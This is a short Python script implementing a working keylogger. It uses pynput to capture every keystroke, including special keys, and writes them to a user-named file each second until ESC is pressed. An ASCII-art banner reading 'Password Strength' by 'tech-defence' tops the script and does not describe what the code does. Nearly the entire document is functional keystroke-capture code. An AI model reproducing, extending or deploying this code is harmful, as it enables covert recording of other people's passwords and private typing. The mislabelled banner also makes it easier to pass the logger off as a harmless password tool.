import pynput
from pynput.keyboard import Key, Listener
import threading
import time

# Color class for ANSI escape sequences
class Colors:
    GREEN = "\033[32m"  # Green text
    RESET = "\033[0m"   # Reset to default text color

# ASCII Art Header
def print_header():
    print(f"""{Colors.GREEN}
 _____                                                    _____ 
( ___ )                                                  ( ___ )
 |   |~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|   | 
 |   | ╔═╗┌─┐┌─┐┌─┐┬ ┬┌─┐┬─┐┌┬┐  ╔═╗┌┬┐┬─┐┌─┐┌┐┌┌─┐┌┬┐┬ ┬ |   | 
 |   | ╠═╝├─┤└─┐└─┐││││ │├┬┘ ││  ╚═╗ │ ├┬┘├┤ ││││ ┬ │ ├─┤ |   | 
 |   | ╩  ┴ ┴└─┘└─┘└┴┘└─┘┴└──┴┘  ╚═╝ ┴ ┴└─└─┘┘└┘└─┘ ┴ ┴ ┴ |   | 
 |___|~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|___| 
(_____)                                                  (_____) ---BY tech-defence
{Colors.RESET}""")

# Print ASCII header
print_header()

# Global variables
log_buffer = []
buffer_lock = threading.Lock()
log_file = None
logging_active = True

# Function to write buffered keystrokes to the file
def write_to_file():
    while logging_active:
        time.sleep(1)  # Write every second
        with buffer_lock:
            if log_buffer and log_file:
                with open(log_file, "a") as f:
                    f.write("".join(log_buffer))
                log_buffer.clear()

# Function to log keystrokes
def log_keystroke(key):
    with buffer_lock:
        try:
            if key == Key.space:
                log_buffer.append(" ")  # Log a space
            elif key == Key.enter:
                log_buffer.append("\n")  # Log a new line
            elif key == Key.tab:
                log_buffer.append("\t")  # Log a tab
            else:
                log_buffer.append(f"{key.char}")  # Log alphanumeric keys
        except AttributeError:
            log_buffer.append(f"[{key}]")  # Log other special keys

# Function to handle ESC key press
def on_press(key):
    if key == Key.esc:
        global log_file, logging_active
        log_file = input("Enter filename to save logs: ")
        logging_active = False  # Stop logging
        print(f"Logging to {log_file} stopped.")
        return False  # Stop the listener
    log_keystroke(key)

# Function to start the keylogger
def start_keylogger():
    # Start the file writing thread
    thread = threading.Thread(target=write_to_file, daemon=True)
    thread.start()

    # Start listening for key presses
    with Listener(on_press=on_press) as listener:
        listener.join()

    # Wait for the writing thread to finish
    thread.join()

if __name__ == "__main__":
    print("Keylogger started. Press ESC to stop and save the logs.")
    start_keylogger()
